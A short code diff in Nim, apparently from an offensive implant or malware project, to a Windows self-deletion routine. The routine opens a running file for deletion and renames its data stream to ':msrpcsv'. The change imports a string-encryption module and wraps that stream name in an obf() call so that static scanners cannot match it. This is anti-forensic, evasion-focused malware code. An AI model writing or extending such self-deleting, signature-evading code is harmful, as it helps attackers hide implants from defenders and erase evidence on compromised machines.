@@ -1,4 +1,5 @@
 import debug
+import strenc
 from winim import PathFileExistsW
 from winim/lean import HINSTANCE, DWORD, LPVOID, WCHAR, PWCHAR, LPWSTR, HANDLE, NULL, TRUE, WINBOOL, MAX_PATH
 from winim/lean import DELETE, OPEN_EXISTING, FILE_DISPOSITION_INFO, INVALID_HANDLE_VALUE, SYNCHRONIZE, FILE_SHARE_READ
@@ -15,7 +16,7 @@ proc dsOpenHandle(pwPath: PWCHAR): HANDLE =
     return CreateFileW(pwPath, DELETE or SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0)
 
 proc dsRenameHandle(hHandle: HANDLE): WINBOOL =
-    let DS_STREAM_RENAME = newWideCString(":msrpcsv")
+    let DS_STREAM_RENAME = newWideCString(obf(":msrpcsv"))
     
     var fRename : FILE_RENAME_INFO
     RtlSecureZeroMemory(addr fRename, sizeof(fRename))
